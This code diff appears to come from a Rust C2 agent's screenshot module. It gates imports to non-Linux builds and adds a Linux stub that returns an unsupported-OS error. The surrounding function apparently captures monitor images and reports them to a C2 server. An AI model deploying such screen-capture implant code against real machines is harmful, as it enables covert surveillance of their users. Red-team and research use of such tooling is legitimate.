@@ -1,14 +1,18 @@
-use alloc::format;
-use alloc::string::{String, ToString};
 use alloc::sync::Arc;
-use alloc::vec::Vec;
 use eldritch_agent::{Agent, Context};
-use image::ImageFormat;
-use pb::c2::report_file_request;
-use pb::{c2, eldritch};
-use std::io::Cursor;
-use std::sync::Mutex;
-use xcap::Monitor;
+
+#[cfg(not(target_os = "linux"))]
+use {
+    alloc::format,
+    alloc::string::{String, ToString},
+    alloc::vec::Vec,
+    image::ImageFormat,
+    pb::c2::report_file_request,
+    pb::{c2, eldritch},
+    std::io::Cursor,
+    std::sync::Mutex,
+    xcap::Monitor,
+};
 
 #[cfg(all(unix, feature = "stdlib"))]
 fn get_hostname() -> String {
@@ -32,6 +36,14 @@ fn get_hostname() -> String {
     "unknown".to_string()
 }
 
+#[cfg(target_os = "linux")]
+pub fn screenshot(agent: Arc<dyn Agent>, context: Context) -> Result<(), String> {
+    return Err(
+        "This OS isn't supported by the screenshot function.\nOnly windows and mac systems are supported".to_string()
+    );
+}
+
+#[cfg(not(target_os = "linux"))]
 pub fn screenshot(agent: Arc<dyn Agent>, context: Context) -> Result<(), String> {
     let monitors = Monitor::all().map_err(|e| e.to_string())?;
 
